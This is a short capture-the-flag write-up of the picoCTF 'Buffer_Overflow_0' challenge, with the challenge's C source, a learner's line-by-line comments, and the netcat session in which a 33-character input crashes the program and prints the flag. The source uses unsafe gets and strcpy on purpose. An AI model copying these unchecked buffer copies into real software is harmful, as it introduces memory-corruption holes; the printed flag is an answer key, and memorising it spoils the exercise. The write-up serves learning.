# CTF Challenge: Buffer_Overflow_0

## Table of Content

- commands-executed:  nc saturn.picoctf.net 58895.
- flag :picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}


### Chain of thought / Learning:
- we have a c program and its source code. so we start by understanding every line of the code.

  ```c
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  #include <signal.h>
  
  #define FLAGSIZE_MAX 64 //defines a file size of 64
  
  char flag[FLAGSIZE_MAX]; //initialize an array with memory of 64 bytes
  
  void sigsegv_handler(int sig) {      /* a function to handle segmentation fault error , it prints the flag when triggered so                                                                           the goal is to trigger segmentation fault*/ 
    printf("%s\n", flag);
    fflush(stdout);
    exit(1);                          //program exits with errors
  }
  
  void vuln(char *input){
    char buf2[16];                    /* I have a pointer input which has the input it takes and copies it to a buf2 variable with 16
                                          byts of memory if I exceed the 16 bytes of memory it should trigger the segmentation fault */
    strcpy(buf2, input);
  }
  
  int main(int argc, char **argv){
    
    FILE *f = fopen("flag.txt","r");            //opens a file named flag.txt in read mode 
    if (f == NULL) {                                                            
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }
    
    fgets(flag,FLAGSIZE_MAX,f);
    signal(SIGSEGV, sigsegv_handler); // This is my segmentation fault detector which will call sigsegv_handler in case that error comes
    
    gid_t gid = getegid();             //something to do with the ids 
    setresgid(gid, gid, gid);
  
  
    printf("Input: ");
    fflush(stdout);
    char buf1[100];                    // 100 byts of input allowed
    gets(buf1);                       // input taken from user   
    vuln(buf1);                       //input fed to our vuln fn
    printf("The program will exit now\n");
    return 0;
  }

  ```
-The plan of action is very simple all i need to do is overflow the memory of buf2 i.e 16 bytes so i'll try 17 characters to see if it fails.
- on using 17 characters segmentation fault was not tripped so i ll try 33(1 more than 16*2) characters.
- it tripped and it worked successfully.
- Major learning : segmentation fault handlers sigsegv_handlers and how they are used to carry out instructions on hitting a memory overflow.

  
#### Output:
```console
┌──(anonymous㉿Anonymous)-[~]
└─$ nc saturn.picoctf.net 60703
saturn.picoctf.net [13.59.203.175] 60703 (?) : Connection refused
                                                                                                                         
┌──(anonymous㉿Anonymous)-[~]
└─$ nc saturn.picoctf.net 58895
Input: eeeeeeeeeeeeeeeee
The program will exit now
                                                                                                                         
┌──(anonymous㉿Anonymous)-[~]
└─$ nc saturn.picoctf.net 58895
Input: eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}


```
